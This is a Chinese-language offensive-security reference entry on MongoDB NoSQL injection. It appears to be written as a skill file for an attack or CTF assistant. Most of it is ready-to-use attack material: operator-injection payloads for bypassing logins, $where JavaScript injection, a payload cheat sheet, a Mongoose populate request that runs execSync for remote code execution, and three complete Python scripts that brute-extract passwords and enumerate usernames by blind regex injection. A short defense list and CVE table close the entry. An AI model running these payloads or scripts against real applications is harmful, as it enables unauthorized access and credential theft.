---
category: web
tags: [nosql_injection, mongodb, nosqli, 注入, 认证绕过, 操作符注入, blind_nosqli, 盲注, ssjs, server_side_js, $where, $ne, $gt, $regex, mongoose, graphql]
triggers: [nosql, nosqli, mongodb injection, mongo injection, $ne, $gt, $regex, $where, $exists, $nin, $func, $lookup, nosqlmap, operator injection, 操作符注入, json injection, mongo auth bypass, nosql blind, mongoose populate]
related: [sqli, command_injection, ssti]
---

# NoSQL 注入 (NoSQL Injection)

## 什么时候用

应用使用 NoSQL 数据库（主要是 MongoDB），且将用户输入直接拼入查询对象而未做类型/操作符过滤。常见场景：

- **登录/注册接口**：用户名/密码字段直接进入 `find()` / `findOne()` 查询
- **搜索/过滤功能**：参数被展开为查询条件（GraphQL filter、REST query params）
- **Node.js + Express**：`req.body` / `req.query` 自动解析嵌套对象（`username[$ne]=`）
- **PHP 应用**：`parameter[key]=value` 自动解析为数组/对象
- **使用 `$where` 的查询**：直接执行 JavaScript，等同于代码注入

## 前提条件

- 后端使用 MongoDB（或其他 NoSQL 数据库：CouchDB、Cassandra 等）
- 用户输入被直接传入查询对象，未做操作符剥离（`$` 开头的 key 未被过滤）
- 对于 `$where` 注入：MongoDB 启用了 server-side JavaScript（v7.0+ 默认禁用）

## 攻击步骤

### 1. 操作符注入（Operator Injection）

核心思路：通过注入 MongoDB 查询操作符改变查询语义。

```bash
# URL 编码形式（PHP / Express 自动解析为对象）
username[$ne]=1&password[$ne]=1                    # {username:{$ne:1}, password:{$ne:1}} → 匹配所有
username[$regex]=^adm&password[$ne]=1              # 正则匹配用户名
username[$gt]=&password[$gt]=                      # 大于空字符串 → 匹配所有非空值
username[$exists]=true&password[$exists]=true      # 字段存在即匹配
username[$nin][0]=admin&username[$nin][1]=test&password[$ne]=7  # 排除特定用户

# JSON 请求体形式
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["Admin", "admin", "root", "administrator"]}, "password": {"$gt": ""}}
```

### 2. 认证绕过

#### 操作符绕过（最常见）

```bash
# 绕过登录 — URL 形式
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*

# 绕过登录 — JSON 形式
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

#### $where JavaScript 绕过

当后端使用 `$where` 拼接查询时，类似 SQL 注入的万能密码：

```javascript
// 后端代码
query = { $where: `this.username == '${username}'` }

// 注入 payload — 制造恒真条件
admin' || 'a'=='a          // → this.username == 'admin' || 'a'=='a'
' || 1==1//                // → 注释掉后续条件
' || 1==1%00               // → null 字节截断
```

对照 SQL 注入：

| SQL 注入 | MongoDB $where 注入 |
|----------|-------------------|
| `' or 1=1-- -` | `' \|\| 1==1//` |
| `' or 1=1#` | `' \|\| 1==1%00` |
| `admin'--` | `admin' \|\| 'a'=='a` |

### 3. 数据提取

#### 提取字段长度

```bash
username[$ne]=toto&password[$regex]=.{1}    # 密码长度 == 1？
username[$ne]=toto&password[$regex]=.{3}    # 密码长度 == 3？
username[$ne]=toto&password[$regex]=.{8}    # 逐步递增，响应变化时即为真实长度
```

#### 逐字符提取数据（基于布尔的盲注）

```bash
# URL 形式 — 已知长度为 3
username[$ne]=toto&password[$regex]=a.{2}   # 首字符是 a？
username[$ne]=toto&password[$regex]=m.{2}   # 首字符是 m？ ✓
username[$ne]=toto&password[$regex]=md.{1}  # 前两位是 md？ ✓
username[$ne]=toto&password[$regex]=mdp     # 完整密码是 mdp？ ✓

# 使用 .* 简化（不需要知道长度）
username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

# JSON 形式
{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}
```

#### 通过 $where + match 提取（Server-Side JS）

```bash
# 检查字段是否存在
/?search=admin' && this.password%00

# 逐字符匹配
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00   # 完整密码
```

#### 跨集合数据提取（$lookup 聚合）

当后端使用 `aggregate()` 时，注入 `$lookup` 可读取其他集合：

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "resultado",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

> `$lookup` 仅在 `aggregate()` 场景下可用，`find()` / `findOne()` 不支持。

### 4. 盲注自动化脚本

#### 基于布尔的密码提取

```python
import requests
import string

url = "http://target.com/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

username = "admin"
password = ""
charset = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

while True:
    found = False
    for c in charset:
        if c in ['*', '+', '.', '?', '|', '\\']:
            c = '\\' + c
        payload = f'username={username}&password[$regex]=^{password}{c}'
        r = requests.post(url, data=payload, headers=headers, allow_redirects=False)
        if r.status_code == 302 or "Welcome" in r.text:
            password += c.lstrip('\\')
            print(f"[+] Password: {password}")
            found = True
            break
    if not found:
        print(f"[*] Final password: {password}")
        break
```

#### JSON 形式的布尔盲注

```python
import requests
import string

url = "http://target.com/api/login"
username = "admin"
password = ""

while True:
    for c in string.printable:
        if c in ['*', '+', '.', '?', '|']:
            continue
        payload = {"username": {"$eq": username}, "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload, verify=False)
        if 'OK' in r.text or r.status_code == 200:
            password += c
            print(f"[+] Found: {password}")
            break
    else:
        print(f"[*] Done: {password}")
        break
```

#### 用户名枚举 + 密码提取

```python
import requests
import string

url = "http://target.com/login"
headers = {"Host": "target.com"}
cookies = {"PHPSESSID": "your_session_id"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\" + c for c in string.punctuation + string.whitespace]

def get_password(username):
    print(f"Extracting password of {username}")
    params = {"username": username, "password[$regex]": "", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            r = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if r.status_code == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print(f"Found password {password[1:].replace(chr(92), '')} for {username}")
            return password[1:].replace("\\", "")

def get_usernames(prefix):
    usernames = []
    params = {"username[$regex]": "", "password[$regex]": ".*"}
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"
        r = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if r.status_code == 302:
            for user in get_usernames(prefix + c):
                usernames.append(user)
    return usernames

for u in get_usernames(""):
    get_password(u)
```

### 5. 基于时间的盲注

```bash
# $where 中使用 sleep（MongoDB server-side JS）
{"$where": "sleep(5000) || true"}

# 利用时间差判断条件
{"$where": "if(this.username=='admin') { sleep(5000); } else { return false; }"}

# URL 形式
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

### 6. 错误注入（Error-Based）

在 `$where` 子句中抛出异常，通过错误消息泄漏数据（需要应用回显数据库错误）：

```json
{"$where": "this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}
```

### 7. Server-Side JS 注入（$where RCE）

当 `$where` 可控且 MongoDB 启用了 server-side JS：

```json
{"$where": "function(){ return true; }"}
{"$where": "this.credits == this.debits"}
```

**Mongoose populate() RCE — CVE-2024-53900 / CVE-2025-23061**：

Mongoose ≤ 8.8.2 的 `populate().match` 直接透传用户对象到 MongoDB，`$where` 可在 Node.js 进程内执行 JavaScript：

```
GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
```

首次修复（8.8.3）仅屏蔽了顶层 `$where`，嵌套在 `$or` 下可绕过（CVE-2025-23061），8.9.5 完全修复。

### 8. PHP $func 任意函数执行

使用 MongoLite（如 Cockpit CMS）时，`$func` 操作符可调用 PHP 函数：

```json
{"user": {"$func": "var_dump"}}
```

### 9. GraphQL → MongoDB 过滤混淆

GraphQL resolver 直接转发 filter 参数到 `collection.find()` 时：

```graphql
query users($f: UserFilter) {
  users(filter: $f) { _id email }
}

# variables
{ "f": { "$ne": {} } }
```

## 常用 Payload 速查

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
```

## 常见坑

- **Content-Type 不匹配**：JSON payload 必须设 `Content-Type: application/json`，URL 编码形式用 `application/x-www-form-urlencoded`。Express 需要 `express.json()` 中间件才解析 JSON body
- **正则特殊字符**：`$regex` 中 `*`、`+`、`.`、`?`、`|`、`\`、`(`、`)` 需要转义，否则正则报错导致盲注失败
- **PHP vs Node.js 解析差异**：PHP 用 `param[$ne]=1`（方括号语法），Node.js/Express 同样支持但也接受 JSON body
- **$where 已禁用**：MongoDB 7.0+ 默认禁用 server-side JS（`--noscripting`），`$where` 注入不可用
- **Mongoose sanitizeFilter**：Mongoose 8.9.5+ 提供 `sanitizeFilter: true` 选项，会剥离查询中的操作符
- **$lookup 场景有限**：只在 `aggregate()` 调用中可用，绝大多数应用使用 `find()` / `findOne()`
- **盲注字符集**：密码可能包含特殊字符，charset 要覆盖 printable ASCII，同时排除正则元字符
- **HTTP 302 vs 200 判断**：登录成功的信号因应用而异（302 重定向、200 + token、Set-Cookie），需先手动确认

## 近年重要 CVE

| 年份 | CVE | 组件 | 概要 |
|------|-----|------|------|
| 2025 | CVE-2025-23061 | Mongoose ≤ 8.9.4 | `populate().match` 嵌套 `$or` 绕过 `$where` 过滤，RCE |
| 2024 | CVE-2024-53900 | Mongoose ≤ 8.8.2 | `populate().match` 直接透传 `$where`，Node.js 进程内 RCE |
| 2023 | CVE-2023-28359 | Rocket.Chat ≤ 6.0.0 | `listEmojiCustom` 方法未验证 selector，`$where` 盲注 |

## 工具

```bash
# NoSQLMap — 自动化 NoSQL 注入检测与利用
# https://github.com/codingo/NoSQLMap
python nosqlmap.py

# NoSQL-Attack-Suite — 多种 NoSQL 注入攻击
# https://github.com/C4l1b4n/NoSQL-Attack-Suite

# nosqli — Go 编写的 NoSQL 注入扫描器
# https://github.com/Charlie-belmer/nosqli

# StealthNoSQL — 高级 NoSQL 注入工具
# https://github.com/ImKKingshuk/StealthNoSQL

# Burp Intruder — 配合 PayloadsAllTheThings NoSQL 字典
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
```

## 防御要点

1. **剥离 `$` 操作符**：使用 `express-mongo-sanitize`、`mongo-sanitize`、或 Mongoose `sanitizeFilter: true`
2. **禁用 server-side JS**：MongoDB 启动参数 `--noscripting`（v7.0+ 默认）
3. **类型校验**：用 Joi/Ajv/Zod 校验输入，确保预期为 string 的字段不接受 object/array
4. **避免 `$where`**：改用 `$expr` 和聚合管道
5. **GraphQL filter 白名单**：不直接展开用户对象，逐字段映射允许的操作符

## 变体

| 变体 | 说明 |
|------|------|
| 操作符注入 | 注入 `$ne`/`$gt`/`$regex` 等改变查询语义 |
| $where JS 注入 | 在 server-side JS 上下文中执行任意代码 |
| 盲注（布尔） | 通过响应差异逐字符提取数据 |
| 盲注（时间） | 通过 `sleep()` 延迟判断条件 |
| 错误注入 | `throw new Error(JSON.stringify(this))` 泄漏文档 |
| $func RCE | MongoLite `$func` 调用 PHP 函数 |
| $lookup 跨集合 | 聚合管道中读取其他集合数据 |
| GraphQL 过滤混淆 | resolver 直接透传 filter 到 MongoDB |

## 相关技术

- [[sqli]] — 同为注入类漏洞，NoSQL 用操作符替代 SQL 语法，但测试思路相似（拼接 → 改变语义 → 提取数据）
- [[command_injection]] — `$where` RCE 后可升级为系统命令执行
- [[ssti]] — 模板注入与 NoSQL 注入均可能出现在同一 Node.js/Express 应用中，注意联合测试
